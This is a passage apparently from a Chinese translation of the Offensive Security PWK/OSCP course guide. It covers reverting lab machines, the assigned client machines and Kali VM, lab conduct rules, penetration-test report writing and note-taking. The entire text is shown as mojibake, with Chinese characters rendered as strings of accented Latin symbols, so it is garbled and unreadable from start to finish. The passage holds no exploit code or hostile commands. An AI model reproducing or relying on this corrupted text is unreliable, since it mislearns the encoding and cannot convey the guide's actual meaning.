éœ€è¦é¢å¤–çš„æ¢å¤ï¼Œä½ å¯ä»¥é€šè¿‡ç”µå­é‚®ä»¶ï¼ˆhelp@offensivesecurity.comï¼‰è”ç³»å­¦ç”Ÿç®¡ç†å‘˜ï¼Œæˆ–è€…è”ç³»åœ¨çº¿æ”¯æŒ$^7$æ¥é‡ç½®ä½ çš„æ¢å¤è®¡æ•°å™¨ã€‚\n\nå®éªŒæœºæ¢å¤çš„æœ€å°é—´éš”æ—¶é—´æ˜¯5åˆ†é’Ÿã€‚\n\nå½“é€‰æ‹©ä¸‹æ‹‰èœå•æ¥æ¢å¤ä¸€å°å®éªŒå®¤æœºå™¨æ—¶ï¼Œä½ å¯ä»¥çœ‹åˆ°è¯¥æœºå™¨æœ€åä¸€æ¬¡è¢«æ¢å¤çš„æ—¶é—´ã€‚å®éªŒæœºä¸­çš„ä¸€äº›æœºå™¨å°†åŒ…å«è„šæœ¬ï¼Œè‡ªåŠ¨é‡å¯å´©æºƒçš„æœåŠ¡æˆ–æ¨¡æ‹Ÿç”¨æˆ·çš„æ“ä½œã€‚è¿™ä¸æ˜¯æ¯ä¸ªç³»ç»Ÿçš„æƒ…å†µï¼Œä½†åœ¨æ‰«ææˆ–åˆ©ç”¨ä¸€ä¸ªç‰¹å®šçš„ç›®æ ‡æœºå™¨æ—¶ï¼Œè¯·è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ã€‚\n\næˆ‘ä»¬å»ºè®®ä½ åœ¨å¼€å§‹æ‰«æå’Œæ”»å‡»ä¸€å°æœºå™¨ä¹‹å‰ï¼Œå…ˆå°†å…¶è¿˜åŸï¼Œä»¥ç¡®ä¿æœºå™¨åŠå…¶æœåŠ¡æŒ‰è®¾è®¡è¿è¡Œã€‚åè¿‡æ¥è¯´ï¼Œä¸€æ—¦ä½ å®Œæˆäº†å¯¹ä¸€å°æœºå™¨çš„æ”»å‡»ï¼Œä½ ä¹Ÿåº”è¯¥è¿˜åŸå®ƒï¼Œä»¥æ¸…é™¤ä½ çš„æ”»å‡»æ‰€ç•™ä¸‹çš„ä»»ä½•äººå·¥åˆ¶å“ï¼Œè¿™æ ·æœºå™¨å°±ä¸ä¼šå¤„äºè¢«åˆ©ç”¨çš„çŠ¶æ€ã€‚\n\n### å®¢æˆ·æœº\n\nä½ å°†è¢«åˆ†é…åˆ°ä¸‰å°ä¸“ç”¨çš„å®¢æˆ·æœºï¼Œä¸è¯¾ç¨‹ææ–™å’Œç»ƒä¹ ä¸€èµ·ä½¿ç”¨ã€‚å…¶ä¸­åŒ…æ‹¬ä¸€ä¸ª Windows 10 å®¢æˆ·ç«¯ï¼ŒDebian Linux å®¢æˆ·ç«¯ï¼Œä»¥åŠä¸€ä¸ª Windows Server 2016 åŸŸæ§åˆ¶å™¨ã€‚\n\n**æ¯å½“ä½ è¿æ¥åˆ°VPNæ—¶ï¼Œä½ å°†éœ€è¦é€šè¿‡å­¦ç”Ÿæ§åˆ¶é¢æ¿è¿˜åŸä½ æƒ³ä½¿ç”¨çš„æœºå™¨**ã€‚å½“ä½ é€‰æ‹©æ¢å¤ Windows10 æˆ– Windows Server 2016 å®¢æˆ·ç«¯æ—¶ï¼Œä¸¤å°æœºå™¨éƒ½å°†è¢«æ¢å¤ã€‚ä½ æŒ‡å®šçš„å®¢æˆ·æœºåœ¨ä½ ä¸ VPN æ–­å¼€è¿æ¥ä¸€æ®µæ—¶é—´åï¼Œä¼šè‡ªåŠ¨å…³é—­ç”µæºå¹¶æ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚\n\nè€ƒè™‘åˆ°ä¸Šè¿°æƒ…å†µï¼Œæˆ‘ä»¬å¼ºçƒˆå»ºè®®ä½ **ä¸è¦åœ¨ä½ çš„ä»»ä½•å®¢æˆ·æœºä¸Šå­˜å‚¨ä»»ä½•ä½ ä¸æ„¿æ„ä¸¢å¤±çš„ä¿¡æ¯**ã€‚\n\n### Kali è™šæ‹Ÿæœº\n\næˆ‘ä»¬åœ¨è¯¾ç¨‹ä¸­æä¾›ç»™ä½ ä½¿ç”¨çš„ VMware é•œåƒ$^8$æ˜¯Kali Linux çš„é»˜è®¤ 64 ä½æ„å»ºã€‚æˆ‘ä»¬å»ºè®®ä½ é€šè¿‡ç”µå­é‚®ä»¶æ¬¢è¿åŒ…ä¸­æä¾›çš„URLä¸‹è½½å¹¶ä½¿ç”¨ VMware é•œåƒã€‚è™½ç„¶ä½ å¯ä»¥è‡ªç”±åœ°ä½¿ç”¨ VirtualBox æˆ– Hyper-Vé•œåƒï¼Œç”šè‡³ä½ è‡ªå·±çš„ Kali å®‰è£…ï¼Œä½†æˆ‘ä»¬åªèƒ½ä¸ºæä¾›çš„ VMware é•œåƒæä¾›æ”¯æŒã€‚è¿™äº›å›¾åƒæ˜¯ç”±Offensive Security æä¾›çš„ï¼ŒKali Linux é¡¹ç›®ç»„ä¸æ”¯æŒã€‚\n\n### å®éªŒå®¤è¡Œä¸ºå’Œå®éªŒå®¤é™åˆ¶\n\nè¿›æ”»æ€§å®‰å…¨å®éªŒå®¤æ˜¯ä¸€ä¸ªå…±äº«ç¯å¢ƒã€‚ åœ¨ä½ æ¢ç´¢å®éªŒå®¤æ—¶ï¼Œè¯·è®°ä½ä»¥ä¸‹å‡ ç‚¹ï¼š\n\n- é¿å…æ”¹å˜ç”¨æˆ·å¯†ç ã€‚ç›¸åï¼Œå¦‚æœå¯èƒ½çš„è¯ï¼Œå‘ç³»ç»Ÿæ·»åŠ æ–°çš„ç”¨æˆ·ã€‚å¦‚æœè¿›å…¥æœºå™¨çš„å”¯ä¸€æ–¹æ³•æ˜¯æ”¹å˜å¯†ç ï¼Œä¸€æ—¦ä½ å®Œæˆäº†å¯¹è¯¥ç‰¹å®šæœºå™¨çš„è®¿é—®ï¼Œè¯·å–„æ„åœ°æŠŠå®ƒæ”¹å›æ¥ã€‚\n- ä½ åœ¨æœºå™¨ä¸Šç¦ç”¨çš„ä»»ä½•é˜²ç«å¢™è§„åˆ™ï¼Œä¸€æ—¦ä½ è·å¾—äº†æ‰€éœ€çš„è®¿é—®çº§åˆ«ï¼Œå°±åº”è¯¥æ¢å¤ã€‚\n- ä¸è¦è®©æœºå™¨å¤„äºéå¯å¼€å‘çŠ¶æ€ã€‚\n- ä¸€æ—¦ä½ å®Œæˆäº†å·¥ä½œï¼Œåº”ä»æœºå™¨ä¸Šåˆ é™¤ä»»ä½•æˆåŠŸï¼ˆå’Œå¤±è´¥ï¼‰çš„åˆ©ç”¨ã€‚å¦‚æœå¯èƒ½çš„è¯ï¼Œåˆ›å»ºä¸€ä¸ªç›®å½•æ¥å­˜å‚¨ä½ çš„æ¼æ´ã€‚è¿™å°†æœ€å¤§é™åº¦åœ°å‡å°‘å…¶ä»–äººæ„å¤–åœ°ä½¿ç”¨ä½ çš„æ¼æ´æ”»å‡»ç›®æ ‡çš„æœºä¼šã€‚\n\nä¸€æ—¦ä½ å®Œæˆäº†å¯¹æ¯å°æœºå™¨çš„æ“ä½œï¼Œä½ å¯ä»¥é€šè¿‡è®°ä½æ¢å¤æ¯å°æœºå™¨æ¥å®ç°è¿™ä¸€åˆ‡ã€‚è¦æ¢å¤ä¸€å°æœºå™¨ï¼Œè¯·ä½¿ç”¨å­¦ç”Ÿæ§åˆ¶é¢æ¿ã€‚\n\nä»¥ä¸‹é™åˆ¶åœ¨å†…éƒ¨VPNå®éªŒå®¤ç½‘ç»œä¸­è¢«ä¸¥æ ¼æ‰§è¡Œã€‚å¦‚æœä½ è¿åäº†ä»¥ä¸‹ä»»ä½•é™åˆ¶ï¼Œè¿›æ”»æ€§å®‰å…¨å…¬å¸ä¿ç•™å–æ¶ˆä½ çš„å®éªŒå®¤è®¿é—®æƒçš„æƒåˆ©ã€‚\n\n1. ä¸è¦å¯¹ç½‘ç»œè¿›è¡ŒARPæ¬ºéª—æˆ–è¿›è¡Œä»»ä½•å…¶ä»–ç±»å‹çš„ä¸­æ¯’æˆ–ä¸­é—´äººæ”»å‡»ã€‚\n2. ä¸è¦åˆ é™¤æˆ–é‡æ–°å®šä½ä»»ä½•å…³é”®çš„ç³»ç»Ÿæ–‡ä»¶æˆ–æç¤ºï¼Œé™¤éæ˜¯æƒé™æå‡çš„ç»å¯¹å¿…è¦ã€‚\n3. ä¸è¦æ”¹å˜ network-secret.txt æˆ– proof.txt æ–‡ä»¶çš„å†…å®¹ã€‚\n4. ä¸è¦æ•…æ„æ‰°ä¹±æ­£åœ¨å®éªŒå®¤å·¥ä½œçš„å…¶ä»–å­¦ç”Ÿã€‚è¿™åŒ…æ‹¬ä½†ä¸é™äºï¼š\n   1. å…³é—­æœºå™¨\n   2. å°†ç”¨æˆ·è¸¢å‡ºæœºå™¨\n   3. å°é”ä¸€ä¸ªç‰¹å®šçš„ IP åœ°å€æˆ–èŒƒå›´\n   4. å…¥ä¾µå…¶ä»–å­¦ç”Ÿçš„å®¢æˆ·ç«¯æˆ– Kali æœºå™¨\n\n## æŠ¥å‘Š\n\næŠ¥å‘Šé€šå¸¸è¢«è§†ä¸ºæ¸—é€æµ‹è¯•çš„å¿…è¦ä¹‹æ¶ã€‚å¯æ‚²çš„æ˜¯ï¼Œè®¸å¤šé«˜æŠ€æœ¯å’Œé«˜æ™ºå•†çš„æ¸—é€æµ‹è¯•äººå‘˜å¹¶æ²¡æœ‰ç»™äºˆå®ƒåº”æœ‰çš„é‡è§†ï¼Œä½†ä¸€ä»½å†™å¾—å¾ˆå¥½ã€çœ‹èµ·æ¥å¾ˆä¸“ä¸šçš„æŠ¥å‘Šæœ‰æ—¶ä¼šæ¯”å†™å¾—å¾ˆå·®ã€ä½†å¾ˆæœ‰æŠ€æœ¯å«é‡çš„åŒç±»æŠ¥å‘Šè·å¾—æ›´å¤šçš„ç§¯æå…³æ³¨ã€‚\n\nç”±äºæ’°å†™æŠ¥å‘Šæ˜¯ä»»ä½•æ¸—é€æµ‹è¯•çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸”æ˜¯ OSCP è€ƒè¯•çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬æƒ³åœ¨ä½ æ¥è¿‘è¯¾ç¨‹ææ–™ä¹‹å‰èŠ±ç‚¹æ—¶é—´è°ˆè°ˆæŠ¥å‘Šçš„æ’°å†™ã€‚æˆ‘ä»¬å¸Œæœ›ï¼Œç°åœ¨å›é¡¾è¿™äº›å‡†åˆ™å°†å¸®åŠ©æ‚¨è€ƒè™‘å¦‚ä½•è§£é‡Šæ¸—é€æµ‹è¯•çš„è¡ŒåŠ¨ã€ç»“æœå’Œç»“æœã€‚\n\næœ‰è®¸å¤šä¸åŒçš„æŠ¥å‘Šå†™ä½œæ–¹æ³•ï¼Œæˆ‘ä»¬ä¸ä¼šå£°ç§° Offensive Security æŠ¥å‘Šæ ·æœ¬$^9$æ˜¯ç»å¯¹æœ€å¥½çš„æŠ¥å‘Šå†™ä½œæ–¹æ³•ã€‚å¦‚æœè¿™ä¸ªä¾‹å­æœ‰å¸®åŠ©ï¼Œè¯·éšæ„ä½¿ç”¨ã€‚å¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆè¯·éšæ„æ”¹å˜è®¾è®¡æˆ–åˆ›é€ å…¶ä»–æ›´é€‚åˆä½ çš„æ–¹æ³•ã€‚\n\næœ‰ä¸€äº›æˆ‘ä»¬è®¤ä¸ºåœ¨å†™æŠ¥å‘Šæ—¶å¿…é¡»ç‰¢è®°çš„ä¸€èˆ¬å‡†åˆ™ã€‚è¿™äº›å‡†åˆ™æ²¡æœ‰ç‰¹åˆ«çš„é¡ºåºï¼Œå› ä¸ºå®ƒä»¬éƒ½åŒæ ·é‡è¦ã€‚\n\n### è€ƒè™‘ç›®æ ‡\n\nè€ƒè™‘åˆ°è¯„ä¼°çš„ç›®æ ‡ã€‚ä½ è®¾å®šçš„ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Ÿä½ æ˜¯å¦å¸Œæœ›åœ¨æŠ¥å‘Šä¸­ä½œå‡ºå•ä¸€çš„ã€å…·ä½“çš„é™ˆè¿°ï¼Ÿè®¸å¤šæ²¡æœ‰ç»éªŒçš„æ¸—é€æµ‹è¯•äººå‘˜ä¼šè¢«è¯„ä¼°çš„æŠ€æœ¯æ–¹é¢å’Œå®Œæˆè¯„ä¼°æ‰€éœ€çš„æŠ€èƒ½æ‰€å¸å¼•ï¼Œä½†æ¸—é€æµ‹è¯•ç»ä¸æ˜¯ä¸€ä¸ªç®€å•ç‚«è€€çš„æœºä¼šã€‚ åœ¨ä½ å¼€å§‹å†™æŠ¥å‘Šæ—¶ï¼Œè¦ç‰¢è®°æœ€åˆçš„ç›®æ ‡ã€‚\n\nç»„ç»‡ä½ çš„å†…å®¹ï¼Œå»ºç«‹ä¸€ä¸ªèƒ½ä¸ä½ çš„å¬ä¼—äº§ç”Ÿæœ€å¤§å…±é¸£çš„æŠ¥å‘Šã€‚æˆ‘ä»¬å¼ºçƒˆå»ºè®®åœ¨å¼€å§‹ä¹‹å‰å†™ä¸€ä¸ªå¤§çº²ã€‚ ä½ å¯ä»¥é€šè¿‡åˆ›å»ºç« èŠ‚æ ‡é¢˜æ¥å¿«é€Ÿè€Œè½»æ¾åœ°å®Œæˆè¿™ä¸€å·¥ä½œï¼Œè€Œä¸éœ€è¦å®é™…çš„å†…å®¹æˆ–è§£é‡Šã€‚ è¿™å°†å¸®åŠ©ä½ é¿å…é‡å¤è‡ªå·±æˆ–é—æ¼å…³é”®ä¿¡æ¯ã€‚å®ƒè¿˜å¯ä»¥å¸®åŠ©ä½ æ›´å®¹æ˜“åœ°å…‹æœå¯æ€•çš„ \"å†™ä½œéšœç¢\"ã€‚\n\n### è€ƒè™‘å¬ä¼—\n\næƒ³ä¸€æƒ³è°ä¼šé˜…è¯»ä½ åœ¨æŠ¥å‘Šä¸­æ‰€åŒ…å«çš„ä¿¡æ¯å¹¶é‡‡å–è¡ŒåŠ¨ã€‚ä½ çš„å¬ä¼—å¸Œæœ›ä»æŠ¥å‘Šä¸­å­¦åˆ°ä»€ä¹ˆï¼Ÿ ä»–ä»¬æ˜¯è°ï¼Ÿ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå…·æœ‰ä¸åŒæŠ€æœ¯çŸ¥è¯†æ°´å¹³çš„äººéƒ½ä¼šé˜…è¯»ä½ çš„æŠ¥å‘Šã€‚è¯•ç€å†™ä¸€äº›ä¸œè¥¿æ¥æ»¡è¶³æŠ¥å‘Šçš„æ¯ä¸ªæ½œåœ¨è¯»è€…ã€‚\n\nå®é™…ä¸Šï¼Œè¿™æ„å‘³ç€æŠŠä½ çš„æŠ¥å‘Šåˆ†æˆå‡ ä¸ªéƒ¨åˆ†æ¥å†™ï¼Œä»¥æ»¡è¶³ä¸åŒå¬ä¼—çš„éœ€è¦ã€‚\n\nè®©æˆ‘ä»¬èŠ±ç‚¹æ—¶é—´å†è°ˆè°ˆè§‚ä¼—çš„é—®é¢˜ã€‚\n\nä½ å¯èƒ½æœŸæœ›å…¬å¸çš„é«˜å±‚ç®¡ç†äººå‘˜é˜…è¯»æŠ¥å‘Šçš„æŸäº›éƒ¨åˆ†ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™äº›é«˜ç®¡æ²¡æœ‰æ—¶é—´æˆ–æ„¿æœ›æ¥é˜…è¯»æ”»å‡»çš„æ‰€æœ‰é«˜åº¦æŠ€æœ¯æ€§ç»†èŠ‚ã€‚ å‡ºäºè¿™ä¸ªåŸå› ï¼Œå¤§å¤šæ•°æŠ¥å‘Šä»¥æ‰§è¡Œæ‘˜è¦å¼€å§‹ã€‚ æ‰§è¡Œæ‘˜è¦åº”è¯¥æ˜¯ä¸€ä¸ªç®€çŸ­çš„ï¼ˆä¸è¶…è¿‡ä¸¤é¡µï¼‰ï¼Œå¯¹ç»“æœå’Œå®¢æˆ·çš„æ•´ä½“å®‰å…¨çŠ¶å†µçš„é«˜çº§è§£é‡Šã€‚ç”±äºè¿™å¯èƒ½æ˜¯ä»–ä»¬å”¯ä¸€ä¼šè¯»åˆ°çš„éƒ¨åˆ†ï¼Œè¯·ç¡®ä¿ä½ ä¸ºé«˜ç®¡ä»¬ä¸“é—¨å®šåˆ¶è¿™ä¸€éƒ¨åˆ†å’Œè¯­è¨€ã€‚\n\nè¿˜ä¼šæœ‰ä¸€ä¸ªç”±æ›´å¤šæŠ€æœ¯ä¸“å®¶ç»„æˆçš„å›¢é˜Ÿï¼Œä»–ä»¬ä¼šæ›´è¯¦ç»†åœ°é˜…è¯»ä½ çš„æŠ¥å‘Šã€‚ æŠ¥å‘Šçš„å…¶ä½™éƒ¨åˆ†åº”è¯¥è¿åˆä»–ä»¬ï¼Œå¹¶å°†åŒ…æ‹¬ä½ å¯¹ç›®æ ‡ç½‘ç»œé€ æˆçš„å¤§å± æ€çš„æ‰€æœ‰è¡€è…¥ç»†èŠ‚ã€‚\n\n### è€ƒè™‘åŒ…æ‹¬å“ªäº›å†…å®¹\n\næ›´å…·ä½“åœ°è¯´ï¼Œè€ƒè™‘ä¸€ä¸‹**ä¸åŒ…æ‹¬**å“ªäº›å†…å®¹æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚è¯·è®°ä½ï¼Œä½ çš„è¯»è€… ä½ çš„è¯»è€…ä¼šæƒ³è§£å†³ä½ å‘ç°çš„é—®é¢˜ï¼Œæ‰€ä»¥ä½ åŒ…æ‹¬çš„æ‰€æœ‰å†…å®¹åº”è¯¥æ˜¯ ç›¸å…³å’Œæœ‰æ„ä¹‰ã€‚ä¸€ä»½è‡ƒè‚¿çš„æŠ¥å‘Šï¼ŒåŒ…å«äº†å¤ªå¤šåˆ‡èº«çš„æˆ–ä¸ç›¸å…³çš„ä¿¡æ¯ï¼Œåªä¼š è®©ä½ çš„è¯»è€…éš¾ä»¥é˜…è¯»å’Œç†è§£ã€‚ä¸è¦ä¸ºäº†è®©æŠ¥å‘Šçœ‹èµ·æ¥æ›´é•¿è€ŒåŠ å…¥å¡«å……ææ–™ ä½¿æŠ¥å‘Šçœ‹èµ·æ¥æ›´é•¿ã€‚\n\nè¿™é‡Œæœ‰å››ä¸ªå…³äºåŒ…æ‹¬ä»€ä¹ˆå’Œä¸åŒ…æ‹¬ä»€ä¹ˆçš„å¿«é€ŸæŒ‡å—ï¼š\n\n1. **é™¤é**ç»å¯¹ç›¸å…³ï¼Œå¦åˆ™ä¸è¦åœ¨æ‚¨çš„æŠ¥å‘Šä¸­åŒ…æ‹¬ä¸€é¡µåˆä¸€é¡µçš„å·¥å…·è¾“å‡ºã€‚è€ƒè™‘ä¸€ä¸‹Nmapçš„è¾“å‡ºã€‚æ‚¨æ²¡æœ‰ç†ç”±åœ¨æ‚¨çš„æŠ¥å‘Šä¸­åŒ…æ‹¬è¾“å‡ºçš„æ¯ä¸€è¡Œï¼Œå› ä¸ºå®ƒä¸ä¼šå¢åŠ ä»»ä½•ä»·å€¼ã€‚å¦‚æœæ‚¨æœ‰ä¸€ä¸ªæƒ³è¡¨è¾¾çš„è§‚ç‚¹ï¼Œä¾‹å¦‚åœ¨å…¬å¼€è®¿é—®çš„ä¸»æœºä¸Šæš´éœ²äº†éå¸¸å¤šçš„SNMPæœåŠ¡ï¼Œé‚£ä¹ˆä½¿ç”¨**-oG**æ ‡å¿—ï¼ŒåªæŠŠé‚£äº›å¼€æ”¾SNMPç«¯å£çš„ä¸»æœºæ‰¾å‡ºæ¥ã€‚\n2. æ˜æ™ºåœ°ä½¿ç”¨å±å¹•æˆªå›¾ã€‚è¿™æ¡è§„åˆ™ä¸ä½ æ·»åŠ åˆ°æŠ¥å‘Šä¸­çš„å…¶ä»–å†…å®¹ä¸€æ ·é€‚ç”¨ã€‚ä½¿ç”¨å±å¹•æˆªå›¾æ¥è¯´æ˜é—®é¢˜ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸ºäº†æ˜¾ç¤ºä»¤äººæ•¬ç•çš„meterpreterè¾“å‡ºã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä½ åœ¨ä¸€å°Linuxä¸»æœºä¸Šè·å¾—äº†rootæƒé™ã€‚ä¸å…¶æ˜¾ç¤º15å¼ åªæœ‰rootç”¨æˆ·æ‰èƒ½è®¿é—®çš„å„ç§ç›®å½•åˆ—è¡¨çš„æˆªå›¾ï¼Œä¸å¦‚åªåŒ…æ‹¬ä¸€å¼ **whoami**å‘½ä»¤è¾“å‡ºçš„æˆªå›¾ã€‚ä¸€ä¸ªç²¾é€šæŠ€æœ¯çš„è¯»è€…å¯èƒ½åªéœ€è¦è¿™ä¸€ä»¶äº‹å°±èƒ½ç†è§£ä½ æ‰€å–å¾—çš„æˆå°±ã€‚\n3. åŒ…æ‹¬é¢å¤–çš„ææ–™ä½œä¸ºé¢å¤–çš„æ”¯æŒæ–‡ä»¶ã€‚å¦‚æœä½ çš„å†…å®¹ä¼šæ¨é«˜é¡µæ•°ï¼Œä½†å¯¹æ•´ä¸ªå—ä¼—æ¥è¯´å¹¶ä¸æ„Ÿå…´è¶£ï¼Œå¯ä»¥è€ƒè™‘åœ¨æŠ¥å‘Šä¹‹å¤–æä¾›é¢å¤–çš„æ”¯æŒæ–‡ä»¶ã€‚éœ€è¦è¿™äº›ä¿¡æ¯çš„è¯»è€…ä»ç„¶å¯ä»¥æ£€æŸ¥æ”¯æŒæ–‡ä»¶ï¼ŒæŠ¥å‘Šçš„è´¨é‡ä¹Ÿä¸ä¼šå—åˆ°å½±å“ã€‚\n4. ä¹Ÿè®¸æœ€é‡è¦çš„æ˜¯ï¼Œè¦å›åˆ°è¯„ä¼°çš„ç›®æ ‡ä¸Šæ¥ã€‚æƒ³ä¸€æƒ³ä½ æƒ³è¡¨è¾¾çš„è§‚ç‚¹ï¼Œå› ä¸ºå®ƒä¸ç›®æ ‡æœ‰å…³ï¼Œå¹¶æƒ³ä¸€æƒ³æ¯æ¡ä¿¡æ¯å°†å¦‚ä½•æˆ–å¦‚ä½•åŠ å¼ºè¯¥è§‚ç‚¹ã€‚\n\n### è€ƒè™‘ä»‹ç»\n\nå†…å®¹çš„è¡¨è¿°ä¸å†…å®¹æœ¬èº«ä¸€æ ·å…³é”®ã€‚ æŒæ¡è¯­è¨€ç»å¯¹æ˜¯æœ€å…³é”®çš„ã€‚è™½ç„¶æˆ‘ä»¬ç†è§£å¯¹æˆ‘ä»¬çš„è®¸å¤šå­¦ç”Ÿæ¥è¯´ï¼Œè‹±è¯­ä¸æ˜¯ä»–ä»¬çš„æ¯è¯­ï¼Œä½†å°è¯•å†™å‡ºè¿è´¯çš„å¥å­ï¼Œä½¿ä¹‹æµç•…å’Œæœ‰é€»è¾‘æ€§ï¼Œä»ç„¶å¾ˆé‡è¦ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé‡è¦çš„æ˜¯ \"æ›´åŠªåŠ›\"ï¼Œå°½æœ€å¤§åŠªåŠ›ï¼Œé›†ä¸­ç²¾åŠ›æå‡ºç®€å•æ˜“æ‡‚çš„è§‚ç‚¹ã€‚\n\næ­¤å¤–ï¼Œä½ å¯èƒ½æƒ³è®°ä½ä»¥ä¸‹å‡ ç‚¹ï¼š\n\n1. è¦ä¿æŒä¸€è‡´ã€‚æ³¨æ„è¯¸å¦‚é—´è·ã€æ ‡é¢˜é£æ ¼ã€å­—ä½“é€‰æ‹©ç­‰æ–¹é¢çš„ä¸ä¸€è‡´ã€‚é”™ä½å’Œä¸ä¸€è‡´çš„æ®µè½æˆ–æ ‡é¢˜çœ‹èµ·æ¥å¾ˆä¸ä¸“ä¸šï¼Œå¾ˆè‰ç‡ã€‚\n2. æ‹¼å†™æ£€æŸ¥ï¼Œæ‹¼å†™æ£€æŸ¥ï¼Œæ‹¼å†™æ£€æŸ¥! è¿™ä¸ªæ˜¯ä¸è¨€è‡ªæ˜çš„ã€‚Their != There, Your != Yourre\n\nè¿™äº›è¦ç‚¹åº”è¯¥è®©ä½ å¤§è‡´äº†è§£å¦‚ä½•å†™å‡ºä¸€ä»½ä¸“ä¸šçš„ã€è¿è´¯çš„æŠ¥å‘Šï¼Œæ¸…æ¥šåœ°ä¼ é€’é¢„æœŸçš„ä¿¡æ¯ã€‚ å½’æ ¹ç»“åº•ï¼ŒæŠ¥å‘Šæ˜¯ä½ äº¤ä»˜ç»™å®¢æˆ·çš„äº§å“ã€‚ç¡®ä¿å®ƒæ­£ç¡®è€Œä¸“ä¸šåœ°ä»£è¡¨ä½ å’Œä½ çš„å·¥ä½œã€‚\n\n### PWK æŠ¥å‘Š\n\nåœ¨ä½ å®Œæˆè¯¾ç¨‹å®éªŒæŒ‡å—å’Œè§†é¢‘åï¼Œä½ å°†åœ¨æˆ‘ä»¬çš„å†…éƒ¨VPNå®éªŒç½‘ç»œå†…è¿›è¡Œä¸€æ¬¡å…¨é¢çš„æ¸—é€æµ‹è¯•ã€‚å¯¹è¿™æ¬¡å®è·µæ¸—é€æµ‹è¯•çš„æŠ¥å‘Šä¸æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œä½†å®ƒå¯èƒ½å¯¹ä½ æœ‰å¥½å¤„ï¼Œå› ä¸ºå®ƒæ˜¯ç»ƒä¹ ä½ åœ¨æ•´ä¸ªèŒä¸šç”Ÿæ¶¯ä¸­éƒ½ä¼šç”¨åˆ°çš„é‡è¦æŠ€èƒ½çš„ä¸€ç§æœ‰ç”¨æ–¹æ³•ã€‚\n\nå¦‚æœä½ é€‰æ‹©å†™å¹¶æäº¤ä½ çš„å®éªŒæŠ¥å‘Šï¼Œä½ éœ€è¦è®°å½•æœ¬å®éªŒæŒ‡å—ä¸­çš„è¯¾ç¨‹ç»ƒä¹ ï¼Œé™¤éå¦æœ‰è¯´æ˜ã€‚ä½ å¯ä»¥å°†è¿™äº›å†…å®¹ä½œä¸ºé™„å½•æ·»åŠ åˆ°ä½ çš„æœ€ç»ˆæŠ¥å‘Šä¸­ï¼Œä½ å°†åœ¨å®Œæˆè®¤è¯è€ƒè¯•åæäº¤ã€‚\n\næœ€åçš„æ–‡ä»¶åº”ä½œä¸ºæ­£å¼çš„æ¸—é€æµ‹è¯•æŠ¥å‘Šæäº¤ã€‚ æ‚¨çš„æŠ¥å‘Šåº”åŒ…æ‹¬æ‰§è¡Œæ‘˜è¦ï¼Œä»¥åŠæ‰€æœ‰æœºå™¨ï¼ˆä¸åŒ…æ‹¬æ‚¨çš„ä¸“ç”¨å®¢æˆ·æœºï¼‰çš„è¯¦ç»†æƒ…å†µã€‚ æœ‰å…³è¯¥è¯¾ç¨‹æŠ¥å‘Šè¦æ±‚çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ¨¡æ¿å’ŒæŠ¥å‘Šæ ·æœ¬ï¼Œå¯åœ¨æˆ‘ä»¬çš„æ”¯æŒç½‘ç«™ $^{10}$ ä¸Šæ‰¾åˆ°ã€‚\n\né™¤äº†å¯é€‰çš„VPNå®éªŒå®¤ç½‘ç»œæ¸—é€æµ‹è¯•æŠ¥å‘Šå¤–ï¼Œé€‰æ‹©OSCPè®¤è¯çš„å­¦ç”Ÿå¿…é¡»æäº¤ä¸€ä»½è€ƒè¯•æ¸—é€æµ‹è¯•æŠ¥å‘Šã€‚è¯¥æŠ¥å‘Šåº”æ˜ç¡®è¯´æ˜ä»–ä»¬æ˜¯å¦‚ä½•æˆåŠŸå®ç°è®¤è¯è€ƒè¯•ç›®æ ‡çš„ã€‚è¿™ä»½æœ€ç»ˆæŠ¥å‘Šå¿…é¡»åœ¨è®¤è¯è€ƒè¯•ç»“æŸå24å°æ—¶å†…ä»¥PDFæ ¼å¼å‘å›ç»™æˆ‘ä»¬çš„è®¤è¯å§”å‘˜ä¼šã€‚\n\nè®¡åˆ’åœ¨é€šè¿‡OSCPè®¤è¯è€ƒè¯•ä¹‹å‰ç”³è¯·CPEå­¦åˆ†çš„å­¦ç”Ÿï¼Œéœ€è¦æ’°å†™å¹¶æäº¤ä¸€ä»½å†…éƒ¨VPNå®éªŒç½‘ç»œçš„æŠ¥å‘Šï¼Œå¹¶å°†è¯¾ç¨‹ç»ƒä¹ ä½œä¸ºé™„å½•ã€‚\n\n## åšç¬”è®°\n\nä¿¡æ¯æ˜¯å…³é”®ï¼Œæ‰€ä»¥åšç¬”è®°å’Œä¿æŒæœ‰æ¡ç†çš„ç¬”è®°æ˜¯è‡³å…³é‡è¦çš„ã€‚è¿™é€‚ç”¨äºPWKè¯¾ç¨‹ã€ç›¸åº”çš„OSCPè€ƒè¯•ï¼Œç”šè‡³æ˜¯ä¸€èˆ¬çš„æ¸—é€æµ‹è¯•ã€‚\n\nç¬”è®°çš„è¯¦ç»†ç¨‹åº¦ç”±ä½ è‡ªå·±å†³å®šã€‚æˆ‘ä»¬å»ºè®®ä½ ä¸€å¼€å§‹å°±è®°å½•**ä¸€åˆ‡**ã€‚è¿™åŒ…æ‹¬æ‰€æœ‰çš„æ§åˆ¶å°è¾“å‡ºï¼Œä»¥åŠå…³é”®äº‹ä»¶çš„å±å¹•æˆªå›¾ã€‚æœ‰å¤ªå¤šçš„ä¸œè¥¿æ€»æ¯”ä¸ºäº†å¡«è¡¥ç©ºç™½è€Œé‡å¤ææ–™è¦å¥½ã€‚\n\nä»ä¸€å¼€å§‹å°±æœ‰æ¡ä¸ç´Šï¼Œä»é•¿è¿œæ¥çœ‹ä¼šæœ‰æ”¶è·ã€‚å¦‚æœä½ åœ¨å‡ å‘¨ã€å‡ ä¸ªæœˆã€ç”šè‡³å‡ å¹´åéœ€è¦è¿”å›ä½ çš„ç¬”è®°ï¼Œç»„ç»‡å·¥ä½œå°†ä½¿ä½ 